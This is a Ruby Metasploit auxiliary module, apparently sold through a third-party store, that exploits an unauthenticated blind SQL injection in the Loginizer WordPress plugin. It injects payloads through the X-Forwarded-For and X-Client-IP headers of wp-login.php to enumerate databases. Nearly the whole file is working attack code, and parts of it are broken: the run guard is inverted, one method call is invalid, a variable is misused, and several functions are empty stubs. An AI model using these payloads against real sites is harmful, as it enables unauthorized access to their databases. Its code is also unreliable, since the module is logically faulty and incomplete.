##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Wordpress Loginizer Blind SQL Injection',
                      'Description'    => %q{
    This module exploits an unauthenticated blind SQL injection
    in the Loginizer Wordpress plugin to enumerate users.

    The Loginizer Wordpress plugin is a popular security-enhancing
    plugin. Unfortunately, versions 1.3.5 and prior suffered from
    an unauthenticated SQL injection. However, this vulnerability
    was only exposed in non-default configurations of the
    Loginizer plugin, such as load-balanced or reverse proxy
    configurations.

    Categories: Open Source, Wordpress

    Price: 6

    Video: none

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
    },
      'References'     =>
    [
    ],
    'Author'         =>
    [
    ],
    'License'        => 'VolatileMinds',
    'DisclosureDate' => 'August 8 2017'
                     ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
        OptBool.new("FORCERUN", [true, 'Run the module whether check returns vulnerable or not', false])
      ], self.class)
  end

  def check
    true_res = make_injected_request("' AND 3318=3318-- fdsa")
    false_res = make_injected_request("' AND 3318=3317-- fdsa")

    if true_res.body =~ /You have exceeded maximum login retries/ and false_res.body =~ /Incorrect Username or Password/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def run

    unless (check == Exploit::CheckCode::Vulnerable && !datastore['FORCERUN'])
      print_error("Check doesn't believe it is vulnerable")
      return
    end

    true_res = /You have exceeded maximum login retries/
    false_res = /Incorrect Username or Password/

    db_count = ''
    j = 1
    while true
      tmp = ''
      48.upto(57) do |i|
        get_db_count = "' AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),#{j},1))=#{i}-- qKWR"
        res = make_injected_request(get_db_count)

        if res.body =~ true_res
          tmp = i.ord
        end
      end
      if tmp == ''
        break
      end
      j = j + 1
      db_count << tmp
    end

    db_count = db_count.to_i

    vprint_good("There are #{db_count} databases.")

    dbs = []
    0.upto(db_count-1) do |i|

      table_name_length = ''
      k = 1
      while true
        tmp = ''
        32.upto(126) do |j|
          get_table_name_length = "' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),#{k},1))=#{j}-- FGxf"
          res = make_injected_request(get_table_name_length)

          if res.body =~ true_res
            tmp = i.ord
          end
        end
        if tmp == ''
          break
        end
        k = k + 1
      end

      table_name_length = table_name_length.to_i

      table_name = ''
      tmp = ''
      0.up(table_name_length-1) do |j|
        get_table_name = "' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),1,1))>64-- FGxf"
      end
    end
  end

  def get_val(row,col,len)

  end

  def get_val_length(row,col)

  end

  def make_injected_request(sql)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-login.php'),
      'method' => 'POST',
      'vars_post' => {
      'log' => Rex::Text.rand_text_alpha(8),
      'pwd' => Rex::Text.rand_text_alpha(8),
      'wp-submi' => 'Log In',
      'redirect_to' => '/wp-admin/'
    },
    'headers' => {
      'X-Forwarded-For' => sql,
      'X-Client-IP' => sql
    }
    })
  end
end

